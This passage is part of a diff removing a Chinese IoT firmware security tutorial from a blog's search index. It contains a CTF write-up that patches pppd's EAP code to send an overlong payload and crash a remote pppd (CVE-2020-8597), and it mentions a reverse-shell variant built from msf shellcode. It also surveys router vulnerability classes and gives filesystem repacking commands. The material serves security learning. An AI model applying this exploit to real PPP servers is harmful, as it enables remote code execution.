aakdaakeaakfaak</span><br></pre></td></tr></table></figure>
-
-<p>接着</p>
-<p>（1）下载ppp的源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>
-
-<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>
-
-<p>修改为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>
-
-<p>（3）编译</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>
-
-<p>（4）在本地机器运行patched <code>pppd</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>
-
-<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830154226602.png" alt="image-20200830154226602"></p>
-<p>获取flag：</p>
-<p>方法一：</p>
-<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
-<p>方法二：</p>
-<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
-<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
-<p>参考：</p>
-<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
-<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
-<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
-<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
-<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
-<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
-<p>考点：</p>
-<ol>
-<li>mips 堆溢出利用；</li>
-<li>uClibc 堆管理机制。 </li>
-</ol>
-<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830015127901.png" alt="image-20200830015127901"></p>
-<p>DLINK DIR-815 路由器前台栈溢出</p>
-<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
-<ul>
-<li>DLINK DIR-859 upnp 协议命令注入</li>
-<li>tplink sr20 路由器命令注入</li>
-<li>Draytek Vigor2960 前台登录处栈溢出</li>
-</ul>
-<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
-<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
-<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
-<p>TPLINK WR841n 路由器后台栈溢出</p>
-<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
-<p>命令注入</p>
-<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
-<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
-<hr>
-<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
-<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
-<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829204006754.png" alt="image-20200829204006754"></p>
-<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
-<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>
-]]></content>
-      <tags>
-        <tag>iot</tag>
       </tags>
   </entry>
 </search>
